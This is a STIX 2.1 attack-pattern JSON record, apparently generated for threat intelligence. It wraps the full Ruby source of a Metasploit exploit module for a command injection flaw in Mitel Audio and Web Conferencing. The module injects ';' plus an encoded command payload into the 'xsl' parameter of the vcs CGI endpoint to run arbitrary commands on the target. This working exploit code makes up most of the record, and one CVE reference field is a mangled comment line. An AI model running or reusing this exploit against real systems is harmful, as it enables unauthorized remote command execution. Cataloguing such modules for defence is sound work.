{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5d1ba941-1b94-4f6d-b944-f6fcd1403613",
    "created": "2024-08-14T17:13:04.435228Z",
    "modified": "2024-08-14T17:13:04.435232Z",
    "name": "Mitel Audio and Web Conferencing Command Injection",
    "description": " This module exploits a command injection flaw within the Mitel Audio and Web Conferencing web interface. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/mitel_awc_exec.rb",
            "external_id": "mitel_awc_exec.rb"
        },
        {
            "source_name": "#\t\tCVE",
            "external_id": ""
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mitel Audio and Web Conferencing Command Injection',\n      'Description'    => %q{\n          This module exploits a command injection flaw within the Mitel\n        Audio and Web Conferencing web interface.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '69934'],\n      #\t\t['CVE',   ''],\n      #\t\t['BID',   '']\n        ],\n      'Platform'       => %w{ linux unix },\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 1024,\n          'BadChars'    => \"<>\",\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl ruby python telnet',\n            }\n        },\n      'Targets'        => [ ['Automatic', { }], ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2010-12-12'\n      ))\n\n    register_options(\n      [\n        OptString.new('URIPATH', [ true,  \"The path to the vcs cgi-bin binary\", \"/awcuser/cgi-bin/vcs\" ])\n      ])\n  end\n\n  def exploit\n    print_status(\"Attempting to execute our command..\")\n\n    res = send_request_cgi(\n      {\n        'uri'          => datastore['URIPATH'],\n        'method'       => 'GET',\n        'vars_get'     => {\n          'xml' => 'withXsl',\n          'xsl' => ';' + payload.encoded\n        }\n      }, 10)\n\n    if res and res.code.to_i > 200\n      print_error(\"Unexpected reply: #{res.code} #{res.body[0,500].inspect}...\")\n      return\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-12-12",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}